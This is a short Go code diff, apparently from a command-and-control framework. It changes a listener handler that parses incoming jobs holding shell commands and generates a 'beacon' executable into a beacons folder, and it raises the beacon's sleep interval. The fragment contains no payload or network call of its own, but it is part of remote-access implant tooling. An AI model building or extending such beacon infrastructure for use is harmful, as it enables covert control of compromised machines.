@@ -75,7 +75,8 @@ func Listener_Handler(w http.ResponseWriter, r *http.Request, listener *Listener
 				body = body[4:]
 				id := int(body[0])
 				var job Job
-				job.command = uint16(body[1])<<8 | uint16(body[2])
+				job.command = binary.BigEndian.Uint16(body[1:3])
+
 				job.shell = string(body[3:])
 				job.funny = true
 
@@ -87,9 +88,9 @@ func Listener_Handler(w http.ResponseWriter, r *http.Request, listener *Listener
 				config.useragent = "Value1"
 				config.a = listener.A
 				config.url = ""
-				config.sleep = 1
+				config.sleep = 1000
 				config.host = "testhost"
-				GenerateOblivionis(config, "")
+				GenerateOblivionis(config, "./beacons/beacon.exe")
 
 				println("had made beacon")
 			}
